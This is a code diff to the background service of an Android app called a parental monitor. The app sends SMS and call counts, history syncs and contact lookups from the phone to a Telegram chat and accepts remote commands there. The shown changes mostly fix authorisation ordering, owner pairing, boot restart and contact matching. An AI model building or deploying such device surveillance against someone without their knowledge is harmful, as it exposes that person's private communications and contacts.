@@ -321,24 +321,32 @@ class MonitoringService : Service() {
                 return START_STICKY
             }
             else -> {
-                try {
-                    if (PreferencesManager.refreshInstance(this)) {
-                        preferencesManager = PreferencesManager.getInstance(this)
-                        refreshCreds()
-                        refreshLoopConfig()
-                    }
-                } catch (_: Exception) {
-                }
                 if (shouldAutoResume()) {
                     startMonitoring()
                     return START_STICKY
-                } else if (needsCredsRetry()) {
-                    MessageScheduler.scheduleBootRestart(this)
-                    return START_NOT_STICKY
-                } else {
-                    stopSelf()
-                    return START_NOT_STICKY
                 }
+                try {
+                    com.redeye.parentalmonitor.utils.Background.runCritical {
+                        try {
+                            if (PreferencesManager.refreshInstance(this@MonitoringService)) {
+                                preferencesManager = PreferencesManager.getInstance(this@MonitoringService)
+                                refreshCreds()
+                                refreshLoopConfig()
+                            }
+                        } catch (_: Exception) {
+                        }
+                        try {
+                            if (shouldAutoResume() || needsCredsRetry()) {
+                                MessageScheduler.scheduleBootRestart(this@MonitoringService)
+                            } else {
+                                stopSelf()
+                            }
+                        } catch (_: Exception) {
+                        }
+                    }
+                } catch (_: Exception) {
+                }
+                return START_NOT_STICKY
             }
             }
             START_STICKY
@@ -781,11 +789,14 @@ class MonitoringService : Service() {
         if (id == 0L) return false
         synchronized(ownerLock) {
             if (cachedOwnerId != 0L) return false
+            try {
+                preferencesManager.setOwnerIdSync(id)
+            } catch (_: Exception) {
+                return false
+            }
+            val stored = try { preferencesManager.ownerUserId } catch (_: Exception) { 0L }
+            if (stored != id) return false
             cachedOwnerId = id
-        }
-        try {
-            preferencesManager.setOwnerIdSync(id)
-        } catch (_: Exception) {
         }
         return true
     }
@@ -809,6 +820,7 @@ class MonitoringService : Service() {
 
     private suspend fun sendPairHint(senderId: String) {
         try {
+            if (cachedOwnerId != 0L) return
             val now = android.os.SystemClock.elapsedRealtime()
             try {
                 val last = pairHintAt[senderId] ?: 0L
@@ -1148,6 +1160,14 @@ class MonitoringService : Service() {
 
     private suspend fun handleCallbackQuery(query: com.redeye.parentalmonitor.network.TelegramCallbackQuery) {
         val sender = query.from?.id?.toString() ?: return
+        val chatId = try { preferencesManager.chatId } catch (_: Exception) { "" }
+        val originChat = try { query.message?.chat?.id?.toString().orEmpty() } catch (_: Exception) { "" }
+        val ownerOk = isOwner(sender)
+        if (sender != chatId && originChat != chatId && !ownerOk) {
+            answerCallback(query.id)
+            return
+        }
+        answerCallback(query.id)
         val dupCallback = synchronized(handledCallbackIds) {
             val seen = !handledCallbackIds.add(query.id)
             while (handledCallbackIds.size > 500) {
@@ -1165,14 +1185,6 @@ class MonitoringService : Service() {
             }
             seen
         }
-        val chatId = try { preferencesManager.chatId } catch (_: Exception) { "" }
-        val originChat = try { query.message?.chat?.id?.toString().orEmpty() } catch (_: Exception) { "" }
-        val ownerOk = isOwner(sender)
-        if (sender != chatId && originChat != chatId && !ownerOk) {
-            answerCallback(query.id)
-            return
-        }
-        answerCallback(query.id)
         if (dupCallback) return
         if (NetworkUtils.isAuthBlocked(preferencesManager)) return
         val command = when (query.data) {
@@ -1941,7 +1953,7 @@ class MonitoringService : Service() {
                 if (started <= 0) {
                     sendToTelegram("\u23F1\uFE0F Uptime unknown.")
                 } else {
-                    val minutes = (System.currentTimeMillis() - started) / 60_000L
+                    val minutes = ((System.currentTimeMillis() - started) / 60_000L).coerceAtLeast(0L)
                     val hours = minutes / 60
                     val days = hours / 24
                     val span = when {
@@ -2452,6 +2464,7 @@ class MonitoringService : Service() {
                 sendToTelegram("History sync partially sent. Remainder follows automatically via periodic updates.")
             }
             preferencesManager.setInitialSyncDoneSync(true)
+            idleDataCycles = 0
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")
 
         } catch (e: kotlinx.coroutines.CancellationException) {
@@ -3243,7 +3256,7 @@ class MonitoringService : Service() {
         val level = batteryLevel()
         sendToTelegram(buildString {
             appendLine("📰 <b>Ringkasan 6 jam</b>")
-            appendLine("SMS masuk: ${if (smsCount < 0) "?" else if (smsCount >= 200) "200+" else "$smsCount"}")
+            appendLine("SMS: ${if (smsCount < 0) "?" else if (smsCount >= 200) "200+" else "$smsCount"}")
             appendLine("Panggilan: ${if (callCount < 0) "?" else if (callCount >= 200) "200+" else "$callCount"}")
             appendLine("Antrean: ${try { messageQueue.getQueueSize() } catch (_: Exception) { "?" }}")
             appendLine("Baterai: ${if (level in 0..100) "$level%" else "?"}")
@@ -4852,6 +4865,18 @@ private suspend fun ringDevice(seconds: Int) {
         }
     }
 
+    private fun contactNumberMatches(haveRaw: String, wantDigits: String): Boolean {
+        return try {
+            val have = haveRaw.filter { it.isDigit() }
+            if (have.isEmpty() || wantDigits.isEmpty()) return false
+            if (have == wantDigits) return true
+            if (wantDigits.length < 7 || have.length < 7) return false
+            have.endsWith(wantDigits.takeLast(7)) || wantDigits.endsWith(have.takeLast(7))
+        } catch (_: Exception) {
+            false
+        }
+    }
+
     private fun searchContacts(query: String): List<Pair<String, String>> {
         val out = mutableListOf<Pair<String, String>>()
         try {
@@ -4861,13 +4886,16 @@ private suspend fun ringDevice(seconds: Int) {
                 android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
             )
             val escaped = query.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_")
+            val qdigits = query.filter { it.isDigit() }
+            val useTail = qdigits.length >= 7
+            val numArg = if (useTail) "%" + qdigits.takeLast(7) + "%" else "%$escaped%"
             val cursor = try {
                 if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                     val bundle = android.os.Bundle().apply {
                         putString(android.content.ContentResolver.QUERY_ARG_SQL_SELECTION, android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ? ESCAPE '\\' OR " + android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER + " LIKE ? ESCAPE '\\'")
-                        putStringArray(android.content.ContentResolver.QUERY_ARG_SQL_SELECTION_ARGS, arrayOf("%$escaped%", "%$escaped%"))
+                        putStringArray(android.content.ContentResolver.QUERY_ARG_SQL_SELECTION_ARGS, arrayOf("%$escaped%", numArg))
                         putString(android.content.ContentResolver.QUERY_ARG_SQL_SORT_ORDER, android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
-                        putInt(android.content.ContentResolver.QUERY_ARG_LIMIT, 10)
+                        putInt(android.content.ContentResolver.QUERY_ARG_LIMIT, if (useTail) 50 else 10)
                     }
                     contentResolver.query(uri, projection, bundle, null)
                 } else {
@@ -4875,7 +4903,7 @@ private suspend fun ringDevice(seconds: Int) {
                         uri,
                         projection,
                         android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ? ESCAPE '\\' OR " + android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER + " LIKE ? ESCAPE '\\'",
-                        arrayOf("%$escaped%", "%$escaped%"),
+                        arrayOf("%$escaped%", numArg),
                         android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                     )
                 }
@@ -4898,7 +4926,10 @@ private suspend fun ringDevice(seconds: Int) {
                 if (nameIdx >= 0 && numIdx >= 0) {
                     while (c.moveToNext() && out.size < 10) {
                         try {
-                            out.add((c.getString(nameIdx) ?: "") to (c.getString(numIdx) ?: ""))
+                            val nm = c.getString(nameIdx) ?: ""
+                            val nb = c.getString(numIdx) ?: ""
+                            if (useTail && !(nm.contains(query, ignoreCase = true) || contactNumberMatches(nb, qdigits))) continue
+                            out.add(nm to nb)
                         } catch (_: Exception) {
                         }
                     }
